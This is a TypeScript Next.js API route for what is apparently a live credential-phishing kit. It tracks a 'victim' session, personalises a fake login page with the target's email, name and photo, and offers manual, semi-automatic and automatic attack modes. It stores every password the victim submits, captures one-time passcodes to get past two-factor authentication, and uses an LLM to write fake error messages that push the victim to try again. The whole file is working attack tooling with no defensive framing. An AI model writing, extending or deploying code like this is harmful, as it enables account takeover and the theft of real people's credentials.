import { NextRequest, NextResponse } from 'next/server';
import { get, ref, set, update, push as firebasePush, remove } from 'firebase/database';
import { db } from '@/lib/firebase';
import { initialState, AppState } from '@/lib/state';
import { simulateErrorWithLLM } from '@/ai/flows/simulate-error';

export const dynamic = 'force-dynamic';

async function getAppState(): Promise<AppState> {
  const configRef = ref(db, 'config');
  const victimRef = ref(db, 'victim');

  const [configSnapshot, victimSnapshot] = await Promise.all([
    get(configRef),
    get(victimRef)
  ]);

  const config = configSnapshot.exists() ? configSnapshot.val() : initialState.config;
  const victim = victimSnapshot.exists() ? victimSnapshot.val() : initialState.victim;

  const currentState = {
    config: { ...initialState.config, ...config },
    victim: { ...initialState.victim, ...victim }
  };
  
  if (!victim.passwords) {
    currentState.victim.passwords = {};
  }


  if (!configSnapshot.exists()) {
    await set(ref(db, 'config'), currentState.config);
  }
   if (!victimSnapshot.exists()) {
    await set(ref(db, 'victim'), currentState.victim);
  }

  return currentState;
}


export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url);
    const view = searchParams.get('view');
    const appState = await getAppState();

    if (view === 'admin') {
      return NextResponse.json(appState);
    }

    if (view === 'victim') {
       if (appState.config.attackMode === 'manual' && appState.victim.currentPage === 'email' && appState.config.targetEmail) {
         const manualStartState = {
            ...appState.victim,
            currentPage: 'login' as const,
            email: appState.config.targetEmail,
            name: appState.config.targetName,
            profilePicture: appState.config.targetProfilePicture,
         };
         await update(ref(db, 'victim'), manualStartState);
         return NextResponse.json({
            ...manualStartState,
            redirectUrl: appState.config.redirectUrl,
         });
       } else if (appState.config.attackMode === 'semi-auto' && appState.victim.currentPage === 'email' && appState.config.targetEmail) {
         const semiAutoStartState = {
            ...appState.victim,
            currentPage: 'pwCatch' as const,
            email: appState.config.targetEmail,
            name: appState.config.targetName,
            profilePicture: appState.config.targetProfilePicture,
         };
         await update(ref(db, 'victim'), semiAutoStartState);
         return NextResponse.json({
            ...semiAutoStartState,
            redirectUrl: appState.config.redirectUrl,
         });
       }


      return NextResponse.json({
        currentPage: appState.victim.currentPage,
        email: appState.victim.email,
        name: appState.victim.name,
        profilePicture: appState.victim.profilePicture,
        errorMessage: appState.victim.errorMessage,
        redirectUrl: appState.config.redirectUrl,
        isTyping: appState.victim.isTyping,
      });
    }

    return NextResponse.json({ error: 'Invalid view' }, { status: 400 });
  } catch (error) {
    console.error("Error in GET /api/state:", error);
    const errorMessage = error instanceof Error ? error.message : 'An unknown error occurred';
    return NextResponse.json({ error: 'Internal Server Error', details: errorMessage }, { status: 500 });
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const stateRef = ref(db, '/');

    switch (body.action) {
      case 'setConfig': {
        const appState = await getAppState();
        if (appState.config.isLocked) {
           return NextResponse.json({ error: 'Configuration is locked.' }, { status: 403 });
        }
        await set(ref(db, 'config'), body.config);
        // Reset victim state when new config is set
        await set(ref(db, 'victim'), initialState.victim);
        return NextResponse.json({ success: true, message: 'Configuration updated' });
      }

      case 'setAttackMode':
        await update(ref(db, 'config'), { attackMode: body.mode });
        // Reset victim state when mode is changed for a clean start
        await set(ref(db, 'victim'), initialState.victim);
        return NextResponse.json({ success: true, message: `Attack mode set to ${body.mode}` });
      
      case 'setTypingStatus':
        await update(ref(db, 'victim'), { isTyping: body.isTyping });
        return NextResponse.json({ success: true });

      case 'setVictimPage':
        await update(ref(db, 'victim'), { currentPage: body.page });
        return NextResponse.json({ success: true, message: `Victim page set to ${body.page}` });

      case 'toggleConfigLock':
        await update(ref(db, 'config'), { isLocked: body.isLocked });
        return NextResponse.json({ success: true, message: `Configuration lock set to ${body.isLocked}` });

      case 'submitEmail': {
        const configRef = ref(db, 'config');
        const configSnapshot = await get(configRef);
        const config = configSnapshot.exists() ? configSnapshot.val() : initialState.config;
        
        const victimUpdate: any = {
          email: body.email,
          currentPage: 'login',
        };

        if (config.targetEmail && body.email.toLowerCase() === config.targetEmail.toLowerCase()) {
          victimUpdate.name = config.targetName;
          victimUpdate.profilePicture = config.targetProfilePicture;
        } else {
          victimUpdate.name = body.email.split('@')[0];
          victimUpdate.profilePicture = '';
        }
        await update(ref(db, 'victim'), victimUpdate);
        return NextResponse.json({ success: true });
      }

      case 'submitPassword': {
        const appState = await getAppState();
        const victim = appState.victim;
        const config = appState.config;

        const newAttempts = (victim.attempts || 0) + 1;
        
        const passwordsRef = ref(db, 'victim/passwords');
        const passwordEntry = {
            value: body.password,
            timestamp: new Date().toISOString(),
            email: victim.email,
            attackMode: config.attackMode,
            attacker: 'Admin' // Assuming a single admin user
        };
        await firebasePush(passwordsRef, passwordEntry);

        let victimUpdate: any = { attempts: newAttempts, isTyping: false };

        if (appState.config.attackMode === 'auto' || appState.config.attackMode === 'semi-auto') {
          victimUpdate.currentPage = 'redirect';
        } else { // Manual mode
           if (victim.currentPage === 'login') {
              victimUpdate.currentPage = 'password';
          } else if (victim.currentPage === 'password') {
              victimUpdate.currentPage = 'pwCatch';
          } else if (victim.currentPage === 'pwCatch') {
            if (newAttempts >= 2) {
              try {
                const { errorMessage } = await simulateErrorWithLLM({ attempts: newAttempts });
                victimUpdate.errorMessage = errorMessage;
                victimUpdate.currentPage = 'error';
              } catch (error) {
                console.error("AI simulation failed:", error);
                victimUpdate.errorMessage = "An unexpected error occurred. Please try again later.";
                victimUpdate.currentPage = 'error';
              }
            } else {
              // In manual mode, after first pwCatch, stay on pwCatch
              // You can advance it manually from the dashboard
            }
          }
        }
        await update(ref(db, 'victim'), victimUpdate);
        return NextResponse.json({ success: true });
      }
      
      case 'submitOtp':
        await update(ref(db, 'victim'), {
          otp: body.otp,
          currentPage: 'redirect'
        });
        return NextResponse.json({ success: true });
      
      case 'restartAttack': {
        const appState = await getAppState();
        const victimRef = ref(db, 'victim');

        if (!appState.victim.email) {
            return NextResponse.json({ error: 'No victim to restart.' }, { status: 400 });
        }
        
        let nextPage: AppState['victim']['currentPage'] = 'login';
        if (appState.config.attackMode === 'semi-auto') {
            nextPage = 'pwCatch';
        } else if (appState.config.attackMode === 'manual') {
            nextPage = 'login';
        }
        
        const resetData: Partial<AppState['victim']> = {
            ...appState.victim, // Preserve existing data
            attempts: 0,
            errorMessage: '',
            isTyping: false,
            currentPage: nextPage,
        };
        
        await update(victimRef, resetData);
        return NextResponse.json({ success: true, message: 'Attack restarted' });
      }


      case 'clearVictimData':
        await set(ref(db, 'victim'), initialState.victim);
        return NextResponse.json({ success: true, message: 'Victim data cleared' });

      case 'deletePassword':
        if (!body.passwordId) {
            return NextResponse.json({ error: 'Password ID is required' }, { status: 400 });
        }
        const passwordRef = ref(db, `victim/passwords/${body.passwordId}`);
        await remove(passwordRef);
        return NextResponse.json({ success: true, message: 'Password deleted' });

      case 'reset':
        await set(ref(db, 'config'), initialState.config);
        await set(ref(db, 'victim'), initialState.victim);
        return NextResponse.json({ success: true, message: 'State reset' });
        
      default:
        return NextResponse.json({ error: 'Invalid action' }, { status: 400 });
    }
  } catch(error) {
    console.error("Error in POST /api/state:", error);
    const errorMessage = error instanceof Error ? error.message : 'An unknown error occurred';
    return NextResponse.json({ error: 'Internal Server Error', details: errorMessage }, { status: 500 });
  }
}
